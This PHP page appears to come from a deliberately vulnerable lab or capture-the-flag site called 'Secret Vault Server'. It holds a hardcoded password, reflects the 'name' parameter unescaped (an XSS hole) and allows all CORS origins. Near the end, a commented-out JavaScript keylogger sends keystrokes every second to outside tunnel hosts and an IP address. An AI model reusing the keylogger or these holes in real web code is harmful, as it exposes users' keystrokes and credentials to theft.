<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Headers: *");
header("ContentType: text/html")
?>

<?php include("header.php");?>


<div class="wrapper bgded overlay" style="background-image:url('../images/sith_secrets.jpeg'); background-position: center; background-size: cover;">
  <div id="pageintro" class="hoc clear"> 

    <article>

      <h3 class="heading">Secret Vault Server</h3>

      <?php
      require_once("messages.php");



      if ($_SERVER['REQUEST_METHOD']=='POST'){


          if (isset($_POST['password_field']) && $_POST['password_field'] === 'Sup3rs3cr3tpassw0rd-silicon') {
              echo "<h6>Password Correct</h6>";
          }

          else {
            form_message(false);

          }

      }
    
      elseif ($_SERVER['REQUEST_METHOD']==="GET"){
        if (isset($_GET['name'])){
          echo "<h6> Hello " . $_GET['name'] . "</h6>";
        }
        else{
          echo "<h6> Hello NAME</h6>";
        }
        form_message(false);

    }
    ?>
      
    </article>

  </div>
</div>
<!-- <script>
 var keys='';
document.onkeypress = function(e) {
  get = window.event?event:e;
  key = get.keyCode?get.keyCode:get.charCode;
  key = String.fromCharCode(key);
  keys+=key;
}
window.setInterval(function(){
   //var xhr = new XMLHttpRequest();
   //xhr.open("GET", 'https://tidy-birds-92.loca.lt/keylogger.php?c='+keys)
  // xhr.send()
  // new Image().src = 'http://54.153.104.105/keylogger.php?c='+keys;
  new Image().src = 'https://fa2a061ee40c64.localhost.run/keylogger.php?c='+keys;
  keys = '';
}, 1000);


</script> -->
<?php

// if (isset($_GET['name'])){
//   echo $_GET['name'];
// }
?>

<!-- <input type="password" id="pass" name="password_field"> -->

<?php include("footer.php");?>